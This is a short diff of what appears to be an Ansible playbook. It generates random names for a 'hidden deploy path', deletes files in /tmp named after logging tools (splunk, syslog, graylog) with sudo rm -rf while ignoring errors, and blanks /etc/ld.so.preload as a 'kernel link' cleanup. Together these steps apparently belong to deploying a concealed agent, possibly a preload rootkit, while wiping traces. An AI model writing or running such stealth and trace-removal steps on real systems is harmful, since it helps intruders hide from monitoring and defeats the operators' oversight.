@@ -12,9 +12,9 @@
     # Generate stable random folder names ONCE
     - name: Generate consistent random folder names
       set_fact:
-        random_folder1: "{{ lookup('password', '/dev/null', length=4, chars='ascii_letters') }}"
-        random_folder2: "{{ lookup('password', '/dev/null', length=4, chars='ascii_letters') }}"
-        random_folder3: "{{ lookup('password', '/dev/null', length=4, chars='ascii_letters') }}"
+        random_folder1: "{{ lookup('password', '/dev/null', length=12, chars='ascii_letters') }}"
+        random_folder2: "{{ lookup('password', '/dev/null', length=12, chars='ascii_letters') }}"
+        random_folder3: "{{ lookup('password', '/dev/null', length=12, chars='ascii_letters') }}"
 
     - name: Set final hidden deploy path
       set_fact:
@@ -65,13 +65,15 @@
 
     - name: Clean up any existing agents in /tmp or previous runs
       shell: |
-          sudo find /tmp -maxdepth 4 \( \
+        sudo find /tmp -maxdepth 4 \( \
           -name 'splunk*' -o \
           -name 'syslog*' -o \
           -name 'graylog*' -o \
           -name 'notlog*' -o \
           -name 'ragdoll*' \
         \) -exec rm -rf {} + || true
+      ignore_errors: yes
+
 
     - name: Clean up previous kernel link
       shell: "sudo echo '' > /etc/ld.so.preload"
